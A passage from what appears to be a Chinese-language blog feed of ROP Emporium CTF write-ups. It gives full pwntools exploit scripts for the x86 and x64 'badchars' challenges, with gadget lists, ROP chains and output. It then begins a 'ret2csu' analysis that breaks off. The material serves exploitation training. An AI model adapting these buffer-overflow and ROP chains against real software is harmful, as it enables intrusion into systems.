<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">36</span>]; <span class="comment">// [esp+10h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;<span class="comment">//0xEB</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目中告诉了我们badchars一共有四个：<code>x</code> <code>g</code> <code>a</code> <code>.</code>，我们需要传递给<code>print_file</code>函数的参数<code>flag.txt</code>中就有4个坏字符。所以我们要想办法避免替换，绕开坏字符检测。</p>
<p>我们首先考虑下没有检测的情况，思路跟write一样，将参数写入到数据段，然后调用<code>print_file</code>函数并将参数传递过去。然后再考虑上坏字符检测，我们就需要对字符做一些操作，比如异或等操作，先对字符加密，然后将字符写入栈，转移到数据段后再解密还原。</p>
<p>根据上题的经验，我们看下程序中是否还存在<code>usefulGadget</code>函数，给我们提供一些有用的Gadgets。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -M intel -dj .text ./badchar32</span></span><br><span class="line">```</span><br><span class="line">08048543 &lt;usefulGadgets&gt;:</span><br><span class="line"> 8048543:	00 5d 00             	add    BYTE PTR [ebp+0x0],bl</span><br><span class="line"> 8048546:	c3                   	ret    </span><br><span class="line"> 8048547:	30 5d 00             	xor    BYTE PTR [ebp+0x0],bl</span><br><span class="line"> 804854a:	c3                   	ret    </span><br><span class="line"> 804854b:	28 5d 00             	sub    BYTE PTR [ebp+0x0],bl</span><br><span class="line"> 804854e:	c3                   	ret    </span><br><span class="line"> 804854f:	89 37                	mov    DWORD PTR [edi],esi</span><br><span class="line"> 8048551:	c3                   	ret    </span><br><span class="line"> 8048552:	66 90                	xchg   ax,ax</span><br><span class="line"> 8048554:	66 90                	xchg   ax,ax</span><br><span class="line"> 8048556:	66 90                	xchg   ax,ax</span><br><span class="line"> 8048558:	66 90                	xchg   ax,ax</span><br><span class="line"> 804855a:	66 90                	xchg   ax,ax</span><br><span class="line"> 804855c:	66 90                	xchg   ax,ax</span><br><span class="line"> 804855e:	66 90                	xchg   ax,ax</span><br></pre></td></tr></table></figure>

<p>我们看到程序给我们提供了<code>mov DWORD PTR [edi],esi</code>，我们可以使用它来将栈中的参数写入数据段，程序还提供给了<code>add</code> <code>sub</code> <code>xor</code>运算，我们可以用它们来对我们传入的加密后的字符进行解密操作。</p>
<p>我们来分析下这几个寄存器的的作用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ebp : 待解密的参数地址，存储加密后参数的位置</span></span><br><span class="line"><span class="comment"># ebx : low 8 bit -&gt; bl store the key to decrypt the args</span></span><br><span class="line"><span class="comment"># edi : the address of encrypted strings in .data section</span></span><br><span class="line"><span class="comment"># esi : store the encrypted strings</span></span><br></pre></td></tr></table></figure>

<p>所以，我们要寻找向这几个寄存器传递值的gadgets，例如<code>pop ebp;ret</code>这种。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./badchars32 --only <span class="string">&quot;pop|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080485bb : pop ebp ; ret</span><br><span class="line">0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804839d : pop ebx ; ret</span><br><span class="line">0x080485ba : pop edi ; pop ebp ; ret</span><br><span class="line">0x080485b9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048386 : ret</span><br><span class="line">0x0804849e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>

<p><code>0x080485b8</code>地址处刚好有对这四个寄存器操作的gadgets，考虑到我们传入的字符中坏字符有4个，而向数据段写入只需要调用两次<code>0x080485b8</code>处的gadget即可，所以我们需要再找单独对<code>ebp</code>寄存器操作的gadget，也就是<code>0x080485bb : pop ebp ; ret</code></p>
<p>使用<code>readelf</code>查看下数据段的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf -S ./badchars32</span><br><span class="line">···</span><br><span class="line">[24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br></pre></td></tr></table></figure>

<p><code>0x0804a018</code>就是数据段的起始地址，接下来我们就可以构造ROP链了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding		#填充</span><br><span class="line">pop_ebx_esi_edi_ebp		#向四个寄存器传递所需的值</span><br><span class="line">0x1						#解密密钥</span><br><span class="line">encrypt(&#x27;flag&#x27;)			#加密过后的字符串</span><br><span class="line">data addr				#要存入的数据段地址</span><br><span class="line">&#x27;a&#x27; addr 				#待解密的字符地址</span><br><span class="line"></span><br><span class="line">mov_esi_[edi]			#将加密后的字符转入数据段</span><br><span class="line">add_[ebp]_bl			#解密字符</span><br><span class="line"></span><br><span class="line">pop_ebp					#传递下一个待解密字符的地址</span><br><span class="line">‘g’ addr				</span><br><span class="line">add_[ebp]_bl			#解密字符</span><br><span class="line">---</span><br><span class="line">pop_ebx_esi_edi_ebp		#向四个寄存器传递所需的值</span><br><span class="line">0x1						#解密密钥</span><br><span class="line">encrypt(&#x27;.txt&#x27;)			#加密过后的字符串</span><br><span class="line">data addr				#要存入的数据段地址</span><br><span class="line">&#x27;.&#x27; addr 				#待解密的字符地址</span><br><span class="line"></span><br><span class="line">mov_esi_[edi]			#将加密后的字符转入数据段</span><br><span class="line">add_[ebp]_bl			#解密字符</span><br><span class="line"></span><br><span class="line">pop_ebp					#传递下一个待解密字符的地址</span><br><span class="line">‘x’ addr				</span><br><span class="line">add_[ebp]_bl			#解密字符</span><br><span class="line"></span><br><span class="line">print_file addr 		#print_file函数地址覆盖返回地址</span><br><span class="line">p32(1)					#预留返回地址</span><br><span class="line">data addr				#解密后的参数地址</span><br></pre></td></tr></table></figure>

<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./badchars32&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./badchars32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print_file_addr = p32(e.plt[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line">encrypted_flag_addr = <span class="number">0x0804a018</span> <span class="comment">#.data section</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encrypt the chars</span></span><br><span class="line">badchars = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">strings,key=<span class="number">0x01</span></span>):</span><br><span class="line">    encrypted_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">list</span>(strings):</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> badchars:</span><br><span class="line">            encrypted_string += <span class="built_in">chr</span>(<span class="built_in">ord</span>(char)-key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            encrypted_string += char</span><br><span class="line">    <span class="keyword">return</span> encrypted_string</span><br><span class="line"></span><br><span class="line">encrypted_strings = encrypt(<span class="string">&#x27;flag.txt&#x27;</span>,key=<span class="number">0x01</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets:</span></span><br><span class="line"><span class="comment"># 0x080485b9 : pop esi ; pop edi ; pop ebp ; ret Nope!</span></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = p32(<span class="number">0x080485b8</span>) <span class="comment">#     pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = p32(<span class="number">0x080485bb</span>)             <span class="comment">#     pop ebp ; ret</span></span><br><span class="line"><span class="comment"># pop_ebx_ret = p32(0x0804839d)             #     pop ebx ; ret</span></span><br><span class="line">mov_esi_to_edis_ret = p32(<span class="number">0x0804854f</span>)     <span class="comment">#     mov dword ptr [edi], esi ; ret</span></span><br><span class="line">add_ebps_bl_ret = p32(<span class="number">0x08048543</span>)         <span class="comment">#     add byte ptr [ebp], bl ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ebp : dai jie mi de canshu address</span></span><br><span class="line"><span class="comment"># ebx : low 8 bit -&gt; bl store the key to decrypt the args</span></span><br><span class="line"><span class="comment"># edi : the address of encrypted strings in .data section</span></span><br><span class="line"><span class="comment"># esi : store the encrypted strings</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= pop_ebx_esi_edi_ebp_ret</span><br><span class="line">payload+= p32(<span class="number">0x01</span>) + <span class="built_in">bytes</span>(encrypted_strings[:<span class="number">4</span>]) + p32(encrypted_flag_addr) + p32(encrypted_flag_addr+<span class="number">2</span>)</span><br><span class="line">payload+= mov_esi_to_edis_ret</span><br><span class="line">payload+= add_ebps_bl_ret</span><br><span class="line"></span><br><span class="line">payload+= pop_ebp_ret</span><br><span class="line">payload+= p32(encrypted_flag_addr+<span class="number">3</span>)</span><br><span class="line">payload+= add_ebps_bl_ret</span><br><span class="line"></span><br><span class="line">payload+= pop_ebx_esi_edi_ebp_ret</span><br><span class="line">payload+= p32(<span class="number">0x01</span>) + <span class="built_in">bytes</span>(encrypted_strings[<span class="number">4</span>:]) + p32(encrypted_flag_addr+<span class="number">4</span>) + p32(encrypted_flag_addr+<span class="number">4</span>)</span><br><span class="line">payload+= mov_esi_to_edis_ret</span><br><span class="line">payload+= add_ebps_bl_ret</span><br><span class="line"></span><br><span class="line">payload+= pop_ebp_ret</span><br><span class="line">payload+= p32(encrypted_flag_addr+<span class="number">6</span>)</span><br><span class="line">payload+= add_ebps_bl_ret</span><br><span class="line"></span><br><span class="line">payload+= print_file_addr</span><br><span class="line">payload+= p32(<span class="number">1</span>)</span><br><span class="line">payload+= p32(encrypted_flag_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">badchars by ROP Emporium</span><br><span class="line">x86</span><br><span class="line"></span><br><span class="line">badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;</span><br><span class="line">&gt; Thank you!</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>



<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>x64与x86思路一样，只是64位可以一次性操作8字节，可以一次性写入<code>flag.txt</code>字符串。</p>
<p>还有一个需要注意的是，64位的数据段起始地址为<code>0x601028</code>，如果我们直接写入到此处，运行exp后会报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Failed to open file: flag.twt</span><br></pre></td></tr></table></figure>

<p>我们可以看到<code>x</code>没有被解密成功，经过调试，发现问题出在数据段的地址上：</p>
<p><code>x</code>对应的地址为<code>0x601028+6</code>，而</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0x601028</span>+<span class="number">6</span>)</span><br><span class="line"><span class="string">&#x27;0x60102e&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">0x2e</span>)</span><br><span class="line"><span class="string">&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>我们传入栈中的加密后的<code>x</code>所在的地址，被当作了坏字符处理了，如下中的<code>ebp</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*R15  0x6010eb ◂— 0x0</span><br><span class="line"> RBP  0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">*RSP  0x7fff8ef4c1b8 —▸ 0x40062c (usefulGadgets+4) ◂— add    byte ptr [r15], r14b /* &#x27;E&#x27; */</span><br><span class="line">*RIP  0x4006a4 (__libc_csu_init+100) ◂— ret    </span><br><span class="line">───────────────────[ DISASM ]────────────────────────</span><br><span class="line">   0x4006a3 &lt;__libc_csu_init+99&gt;     pop    rdi</span><br><span class="line"> ► 0x4006a4 &lt;__libc_csu_init+100&gt;    ret                                  &lt;0x40062c; usefulGadgets+4&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40062c &lt;usefulGadgets+4&gt;        add    byte ptr [r15], r14b</span><br></pre></td></tr></table></figure>

<p>所以我们要改变下存入的地址，将数据段地址+7作为存储的地址，就不会在地址处包含换字节了。</p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print_addr = e.plt[<span class="string">&#x27;print_file&#x27;</span>]</span><br><span class="line">data_addr = <span class="number">0x0000000000601028</span>+<span class="number">7</span> <span class="comment">#Note!!!! 28+7=2e ,chr(2e)=. is a badchars in payload</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encrypt the chars</span></span><br><span class="line">badchars = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">strings,key=<span class="number">0x01</span></span>):</span><br><span class="line">    encrypted_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">list</span>(strings):</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> badchars:</span><br><span class="line">            encrypted_string += <span class="built_in">chr</span>(<span class="built_in">ord</span>(char)-key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            encrypted_string += char</span><br><span class="line">    <span class="keyword">return</span> encrypted_string</span><br><span class="line"></span><br><span class="line">encrypted_strings = encrypt(<span class="string">&#x27;flag.txt&#x27;</span>,key=<span class="number">0x01</span>)</span><br><span class="line"><span class="comment">#Gadgets</span></span><br><span class="line">pop_r12_r13_r14_r15_addr = <span class="number">0x000000000040069c</span> <span class="comment"># pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_r14_r15_addr = <span class="number">0x00000000004006a0</span> <span class="comment"># pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x00000000004006a3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_r15_addr = <span class="number">0x00000000004006a2</span> <span class="comment"># pop r15 ; ret</span></span><br><span class="line">mov_r12_to_r13s_addr = <span class="number">0x0000000000400634</span> <span class="comment"># mov qword ptr [r13], r12 ; ret</span></span><br><span class="line">add_r14b_r15s_addr = <span class="number">0x000000000040062c</span> <span class="comment"># add byte ptr [r15], r14b ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r15 : dai jie mi de canshu address</span></span><br><span class="line"><span class="comment"># r14 : low 8 bit -&gt; bl store the key to decrypt the args</span></span><br><span class="line"><span class="comment"># r13 : the address of encrypted strings in .data section</span></span><br><span class="line"><span class="comment"># r12 : store the encrypted strings</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= p64(pop_r12_r13_r14_r15_addr)</span><br><span class="line">payload+= <span class="built_in">bytes</span>(encrypted_strings) + p64(data_addr) + p64(<span class="number">0x01</span>) + p64(data_addr+<span class="number">2</span>)</span><br><span class="line">payload+= p64(mov_r12_to_r13s_addr)</span><br><span class="line">payload+= p64(add_r14b_r15s_addr)</span><br><span class="line"></span><br><span class="line">payload+= p64(pop_r15_addr)</span><br><span class="line">payload+= p64(data_addr+<span class="number">3</span>)</span><br><span class="line">payload+= p64(add_r14b_r15s_addr)</span><br><span class="line"></span><br><span class="line">payload+= p64(pop_r15_addr)</span><br><span class="line">payload+= p64(data_addr+<span class="number">4</span>)</span><br><span class="line">payload+= p64(add_r14b_r15s_addr)</span><br><span class="line"></span><br><span class="line">payload+= p64(pop_r14_r15_addr)</span><br><span class="line">payload+= p64(<span class="number">0x1</span>)</span><br><span class="line">payload+= p64(data_addr+<span class="number">6</span>)</span><br><span class="line">payload+= p64(add_r14b_r15s_addr)</span><br><span class="line"></span><br><span class="line">payload+= p64(pop_rdi_addr)</span><br><span class="line">payload+= p64(data_addr)</span><br><span class="line">payload+= p64(print_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">badchars by ROP Emporium</span><br><span class="line">x86_64</span><br><span class="line"></span><br><span class="line">badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Thank you!</span></span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> </span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Challenge8_ret2csu</title>
    <url>/2023/03/28/ROP_Emporium/Challenge8-ret2csu/</url>
    <content><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>题目链接：<a href="https://ropemporium.com/challenge/ret2csu.html">https://ropemporium.com/challenge/ret2csu.html</a></p>
<p>参考博客：<a href="https://blog.csdn.net/Ga4ra/article/details/123791650">https://blog.csdn.net/Ga4ra/article/details/123791650</a></p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>根据题目名称以及给出的提示，明显我们需要使用ret2csu，有关ret2csu的知识移步《看雪pwn入门篇》或者直接百度。这里我们还是按照常规思路来分析下。</p>
<span id="more"></span>

<p>首先查看程序保护情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./ret2csu</span> </span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level8_ret2csu/64/ret2csu&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  &#x27;.&#x27;</span><br></pre></td></tr></table></figure>

<p>可以看到程序开启了NX保护。</p>
<p>接着我们使用radare2来查看程序中的函数信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./ret2csu</span> </span><br><span class="line"><span class="meta prompt_">[0x00400520]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x00400520    1     42 entry0</span><br><span class="line">0x004004d0    3     23 sym._init</span><br><span class="line">0x004006b4    1      9 sym._fini</span><br><span class="line">0x00400560    4     37 sym.deregister_tm_clones</span><br><span class="line">0x00400590    4     55 sym.register_tm_clones</span><br><span class="line">0x004005d0    3     29 sym.__do_global_dtors_aux</span><br><span class="line">0x00400600    1      7 sym.frame_dummy</span><br><span class="line">0x00400617    1     27 sym.usefulFunction</span><br><span class="line">0x00400510    1      6 sym.imp.ret2win</span><br><span class="line">0x004006b0    1      2 sym.__libc_csu_fini</span><br><span class="line">0x00400640    4    101 sym.__libc_csu_init</span><br><span class="line">0x00400550    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x00400607    1     16 main</span><br><span class="line">0x00400500    1      6 sym.imp.pwnme</span><br></pre></td></tr></table></figure>

<p>可以看到，pwnme和ret2win这次在链接库中，我们先来查看下usefulFunction函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x00400520</span>]&gt; s sym.usefulFunction </span><br><span class="line">[<span class="number">0x00400617</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.usefulFunction(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    sym.imp.ret2win(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，usefulFunction函数调用了链接库中的ret2win函数，这里一开始我觉的没什么用，后来想了想，正是由于这里调用了ret2win，我们才能直接在后续构造ROP链的时候，通过<code>elf.plt[&#39;ret2win&#39;]</code>来实现对ret2win函数的调用，而不用泄露libc的地址。</p>
<p>我们接着进入链接库中，查看pwnme和ret2win：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ r2 -A ./libret2csu.so </span><br><span class="line">[<span class="number">0x00000860</span>]&gt; s sym.pwnme </span><br><span class="line">[<span class="number">0x0000093a</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.pwnme(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    ulong buf;</span><br><span class="line">    </span><br><span class="line">    sym.imp.setvbuf(*_reloc.<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="number">0xc88</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="number">0xca0</span>);</span><br><span class="line">    sym.imp.<span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="number">0xca8</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="number">0xd12</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="number">0xd15</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到read处存在栈溢出，并且溢出空间比较大。ret2win函数我们使用IDA来查看，IDA相比radare2还是要更直观一些。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">ret2win</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *streama; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;encrypted_flag.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !g_buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Could not allocate memory&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = fgets(g_buf, <span class="number">33</span>, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    streama = fopen(<span class="string">&quot;key.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !streama )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(streama);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，ret2win函数需要三个参数<code>0xdeadbeefdeadbeef</code> <code> 0xcafebabecafebabe</code>   <code>0xd00df00dd00df00d</code>，然后解密文件，输出flag。</p>
<p>看到这里我们的大致思路就有了。</p>
<ul>
<li>通过pop rdi，rsi，rdx或者mov rdi等这类的gadgets来传递参数</li>
<li>覆盖返回地址为ret2win@plt地址来调用函数，获取gadgets</li>
</ul>
<p>接下来就是找gadgets：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ret2csu --only <span class="string">&quot;pop|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006a2 : pop r15 ; ret</span><br><span class="line">0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400588 : pop rbp ; ret</span><br><span class="line">0x00000000004006a3 : pop rdi ; ret</span><br><span class="line">0x00000000004006a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004e6 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>

<p>这里我们可以看到，并没有对rdx操作的寄存器，我们在pwndbg中再查找下：</p>
